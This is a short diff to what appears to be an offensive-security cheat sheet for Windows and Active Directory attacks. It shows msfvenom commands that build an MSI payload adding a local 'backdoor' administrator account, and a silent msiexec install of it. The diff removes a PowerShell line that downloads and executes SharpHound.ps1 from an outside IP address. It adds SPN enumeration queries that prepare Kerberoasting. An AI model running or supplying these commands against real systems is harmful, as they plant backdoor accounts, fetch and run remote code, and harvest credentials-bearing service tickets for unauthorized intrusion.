@@ -242,11 +242,13 @@ msfvenom -p windows/adduser USER=backdoor PASS=backdoor123 -f msi -o evil.msi
 msfvenom -p windows/adduser USER=backdoor PASS=backdoor123 -f msi-nouac -o evil.msi
 msiexec /quiet /qn /i C:\evil.msi
 ```
-# ATTACk - ACTIVE DIRECTORY
+# ATTACK - ACTIVE DIRECTORY
 ## KERBEROASTING
 ##### KERBEROASTING - FIND SPN
 ```
-IEX (New-Object System.Net.WebClient).DownloadString("http://175.12.80.10:8080/SharpHound.ps1")
+Get-ADUSer -Filter { ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName | select SamAccountName, ServicePrincipalName
+$FormatEnumerationLimit=-1
+Get-ADComputer -Filter { ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName | select SamAccountName, ServicePrincipalName | Out-String -Width 4096
 ```
 ##### KERBEROASTING - LIST ALL SPN
 ```
